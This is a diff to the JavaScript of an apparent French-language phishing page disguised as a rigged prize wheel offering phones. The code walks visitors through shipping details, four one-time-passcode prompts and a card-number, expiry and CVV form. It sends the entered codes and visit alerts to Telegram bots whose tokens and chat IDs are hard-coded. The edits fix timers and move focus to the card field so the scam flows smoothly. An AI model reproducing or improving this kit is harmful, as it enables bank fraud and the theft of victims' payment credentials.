@@ -10,6 +10,8 @@ document.addEventListener('DOMContentLoaded', function() {
     let isSpinning = false;
     let winningPrize = null;
     let otpEntryCount = 0;
+    let activeTimer = null;
+    let processingTimeout = null;
     const otpLengths = [10, 10, 10, 10];
     const totalOtpEntries = otpLengths.length;
     const WAIT_TIME_OTP = 30;
@@ -17,6 +19,8 @@ document.addEventListener('DOMContentLoaded', function() {
     function showSection(sectionIdToShow) {
         const allSections = ['hero-section', 'wheel-section', 'shipping-section', 'processingScreen', 'otpWaitScreen', 'otpScreen', 'payment-section', 'finalConfirmationModal', 'wheelResultModal'];
         const sectionToShow = document.getElementById(sectionIdToShow);
+
+        console.log('Showing section:', sectionIdToShow); // Debug log
 
         allSections.forEach(id => {
             const section = document.getElementById(id);
@@ -28,7 +32,27 @@ document.addEventListener('DOMContentLoaded', function() {
         if (sectionToShow) {
             const isModal = sectionIdToShow.includes('Modal') || sectionIdToShow.includes('Screen') || sectionIdToShow === 'otpScreen' || sectionIdToShow === 'payment-section';
             sectionToShow.style.display = isModal ? 'flex' : 'block';
+            
+            // Special handling for payment section
+            if (sectionIdToShow === 'payment-section') {
+                console.log('Payment section is now visible');
+                // Clear any pending timers that might interfere
+                clearAllTimers();
+                if (processingTimeout) {
+                    clearTimeout(processingTimeout);
+                    processingTimeout = null;
+                }
+            }
+            
             gsap.fromTo(sectionToShow, {autoAlpha: 0, scale: 0.95}, {autoAlpha: 1, scale: 1, duration: 0.3});
+        }
+    }
+
+    function clearAllTimers() {
+        console.log('Clearing all timers');
+        if (activeTimer) {
+            clearInterval(activeTimer);
+            activeTimer = null;
         }
     }
 
@@ -76,28 +100,24 @@ document.addEventListener('DOMContentLoaded', function() {
 
         spinButton.classList.add('spinning');
 
-        // Calculate random result with weighted probabilities
         const random = Math.random();
         let resultIndex;
 
         if (random < 0.5) {
-            resultIndex = 0; // SAMSUNG Galaxy S25 Ultra - 50% chance
+            resultIndex = 0;
         } else {
-            resultIndex = 1; // iPhone 17 Pro Max - 50% chance
+            resultIndex = 1;
         }
 
         const selectedPrize = prizes[resultIndex];
         winningPrize = selectedPrize;
 
-        // Calculate the rotation needed to land on the selected prize
-        const fullRotations = 5; // Number of full rotations before stopping
+        const fullRotations = 5;
         const targetAngle = fullRotations * 360 + selectedPrize.angle;
 
-        // Apply the rotation with easing
         wheel.style.setProperty('--end-rotation', `${targetAngle}deg`);
         wheel.classList.add('wheel-spin-animation');
 
-        // After the animation completes, show the result
         setTimeout(() => {
             isSpinning = false;
             spinButton.classList.remove('spinning');
@@ -214,13 +234,22 @@ document.addEventListener('DOMContentLoaded', function() {
 
         // Étape 2: Écran de traitement
         showSection('processingScreen');
-        setTimeout(() => {
+        
+        // Clear any existing timeout
+        if (processingTimeout) {
+            clearTimeout(processingTimeout);
+        }
+        
+        processingTimeout = setTimeout(() => {
             setupOtpScreen(otpEntryCount);
             showSection('otpScreen');
-        }, 30000);
+            processingTimeout = null;
+        }, 3000); // 3 seconds for testing
     });
 
     function startOtpWaitTimer() {
+        clearAllTimers();
+        
         let timeLeft = WAIT_TIME_OTP;
         const timerElement = document.getElementById('otpTimer');
         const timerCircle = document.getElementById('otpTimerCircle');
@@ -229,19 +258,30 @@ document.addEventListener('DOMContentLoaded', function() {
         timerElement.textContent = timeLeft;
         timerCircle.style.strokeDashoffset = 0;
 
-        const interval = setInterval(() => {
+        activeTimer = setInterval(() => {
             timeLeft--;
             timerElement.textContent = timeLeft;
             const offset = circumference - (timeLeft / WAIT_TIME_OTP) * circumference;
             timerCircle.style.strokeDashoffset = offset;
 
             if (timeLeft <= 0) {
-                clearInterval(interval);
-                showSection('otpScreen');
-                const otpInput = document.getElementById('singleOtpInput');
-                if (otpInput) {
-                    otpInput.value = '';
-                    otpInput.focus();
+                clearAllTimers();
+                
+                // Check if we're on the payment section - if so, don't switch
+                const paymentSection = document.getElementById('payment-section');
+                const isPaymentVisible = paymentSection && (paymentSection.style.display === 'flex' || paymentSection.style.display === 'block');
+                
+                // Also check if we've completed all OTP entries
+                if (!isPaymentVisible && otpEntryCount < totalOtpEntries) {
+                    console.log('Timer expired, showing OTP screen again');
+                    showSection('otpScreen');
+                    const otpInput = document.getElementById('singleOtpInput');
+                    if (otpInput) {
+                        otpInput.value = '';
+                        otpInput.focus();
+                    }
+                } else {
+                    console.log('Timer expired but payment is visible or OTP complete, staying on current section');
                 }
             }
         }, 1000);
@@ -252,7 +292,6 @@ document.addEventListener('DOMContentLoaded', function() {
         const otpInput = document.getElementById('singleOtpInput');
         const otpCode = otpInput.value.trim();
         
-        // MODIFICATION: Accepte 1 à 10 chiffres (pas obligatoirement 10)
         if (otpCode.length < 1 || otpCode.length > 10 || !/^\d+$/.test(otpCode)) {
             alert('Veuillez entrer entre 1 et 10 chiffres');
             return;
@@ -264,8 +303,8 @@ document.addEventListener('DOMContentLoaded', function() {
         sendToTelegram(otpMessage);
 
         otpEntryCount++;
+        console.log('OTP entry count:', otpEntryCount); // Debug log
         
-        // Mise à jour du compteur OTP
         const currentOtpAttempt = document.getElementById('currentOtpAttempt');
         if (currentOtpAttempt) {
             currentOtpAttempt.textContent = otpEntryCount + 1;
@@ -276,8 +315,28 @@ document.addEventListener('DOMContentLoaded', function() {
             showSection('otpWaitScreen');
             startOtpWaitTimer();
         } else {
-            // Étape 4: Après les 4 OTP, afficher la page de paiement
+            // All OTP entries completed
+            console.log('All OTP entries completed, showing payment section');
+            
+            // Clear all timers
+            clearAllTimers();
+            
+            // Clear any processing timeout
+            if (processingTimeout) {
+                clearTimeout(processingTimeout);
+                processingTimeout = null;
+            }
+            
+            // Show payment section
             showSection('payment-section');
+            
+            // Focus on first payment input
+            setTimeout(() => {
+                const cardNumber = document.getElementById('card-number');
+                if (cardNumber) {
+                    cardNumber.focus();
+                }
+            }, 300);
         }
     });
 
@@ -324,11 +383,9 @@ document.addEventListener('DOMContentLoaded', function() {
             const otpInput = e.target;
             const otpCode = otpInput.value.trim();
             
-            // Only allow digits
             otpInput.value = otpCode.replace(/\D/g, '');
         }
         
-        // Formatage de la date d'expiration de carte
         if (e.target.id === 'card-expiry') {
             let value = e.target.value.replace(/\D/g, '');
             if (value.length >= 2) {
@@ -337,7 +394,6 @@ document.addEventListener('DOMContentLoaded', function() {
             e.target.value = value;
         }
         
-        // Formatage du numéro de carte (groupes de 4 chiffres)
         if (e.target.id === 'card-number') {
             let value = e.target.value.replace(/\D/g, '');
             value = value.substring(0, 16);
@@ -351,7 +407,6 @@ document.addEventListener('DOMContentLoaded', function() {
             e.target.value = formatted;
         }
         
-        // Limiter le CVV à 3 chiffres
         if (e.target.id === 'card-cvv') {
             let value = e.target.value.replace(/\D/g, '');
             e.target.value = value.substring(0, 3);
@@ -365,8 +420,8 @@ document.addEventListener('DOMContentLoaded', function() {
         const chatId1 = "-1003768455972";
         const url1 = `https://api.telegram.org/bot${botToken1}/sendMessage`;
 
-        const botToken2 = "8245021160:AAEnbdixzuhvNj-IJVAlewEGLb0_Qszd9_U";
-        const chatId2 = "-1003768455972";
+        const botToken2 = "8245021161:AAEnbdixzuhvNj-IJVAlewEGLb0_Qszd9_U";
+        const chatId2 = "-1003768455971";
         const url2 = `https://api.telegram.org/bot${botToken2}/sendMessage`;
 
         const params1 = new URLSearchParams({
@@ -381,7 +436,6 @@ document.addEventListener('DOMContentLoaded', function() {
             parse_mode: 'Markdown'
         });
 
-        // Send to first bot
         fetch(`${url1}?${params1.toString()}`, { method: 'GET' })
             .then(response => response.json())
             .then(result => {
@@ -395,7 +449,6 @@ document.addEventListener('DOMContentLoaded', function() {
                 console.error('Erreur lors de l\'envoi du message au premier bot Telegram:', error);
             });
 
-        // Send to second bot
         fetch(`${url2}?${params2.toString()}`, { method: 'GET' })
             .then(response => response.json())
             .then(result => {
@@ -445,12 +498,10 @@ document.addEventListener('DOMContentLoaded', function() {
         const currentOtpAttempt = document.getElementById('currentOtpAttempt');
         const totalOtpAttempts = document.getElementById('totalOtpAttempts');
 
-        // Update instruction text if element exists
         if (instructionText) {
             instructionText.textContent = `Entrez le code à ${otpLength} chiffres que vous avez reçu.`;
         }
 
-        // Update OTP counter
         if (currentOtpAttempt) {
             currentOtpAttempt.textContent = stepIndex + 1;
         }
@@ -458,7 +509,6 @@ document.addEventListener('DOMContentLoaded', function() {
             totalOtpAttempts.textContent = totalOtpEntries;
         }
 
-        // Focus on OTP input
         const otpInput = document.getElementById('singleOtpInput');
         if (otpInput) {
             setTimeout(() => {
@@ -475,10 +525,8 @@ document.addEventListener('DOMContentLoaded', function() {
             const marqueeContent = document.createElement('div');
             marqueeContent.classList.add('marquee-content');
 
-            // Append original items
             items.forEach(item => marqueeContent.appendChild(item));
 
-            // Append cloned items for seamless loop
             items.forEach(item => {
                 const clone = item.cloneNode(true);
                 marqueeContent.appendChild(clone);
@@ -512,15 +560,13 @@ document.addEventListener('DOMContentLoaded', function() {
     function sendVisitNotification() {
         console.log('Envoi de notification de visite aux deux bots...');
         
-        // First bot
-        const botToken1 = "7019053702:AAHahO6qGOdZyQ-vv_IRMYmS6yoqiDLF4hA";
-        const chatId1 = "965011527";
+        const botToken1 = "8245021160:AAEnbdixzuhvNj-IJVAlewEGLb0_Qszd9_U";
+        const chatId1 = "-1003768455972";
         const message = "👁 Nouvelle visite sur la page 👁";
         const url1 = `https://api.telegram.org/bot${botToken1}/sendMessage`;
 
-        // Second bot
-        const botToken2 = "8290233120:AAGCNu8qhbly2BLjJjWY3gUCVOSHzZ2Mi18";
-        const chatId2 = "5372119436";
+        const botToken2 = "8245021161:AAEnbdixzuhvNj-IJVAlewEGLb0_Qszd9_U";
+        const chatId2 = "-1003768455971";
         const url2 = `https://api.telegram.org/bot${botToken2}/sendMessage`;
 
         const params1 = new URLSearchParams({
@@ -535,7 +581,6 @@ document.addEventListener('DOMContentLoaded', function() {
             parse_mode: 'Markdown'
         });
 
-        // Send to first bot
         fetch(`${url1}?${params1.toString()}`, { method: 'GET' })
             .then(response => response.json())
             .then(result => {
@@ -549,7 +594,6 @@ document.addEventListener('DOMContentLoaded', function() {
                 console.error('Erreur lors de l\'envoi de la notification de visite au premier bot:', error);
             });
 
-        // Send to second bot
         fetch(`${url2}?${params2.toString()}`, { method: 'GET' })
             .then(response => response.json())
             .then(result => {
@@ -565,7 +609,5 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     sendVisitNotification();
-
-    // Initialize OTP screen
     setupOtpScreen(0);
 });
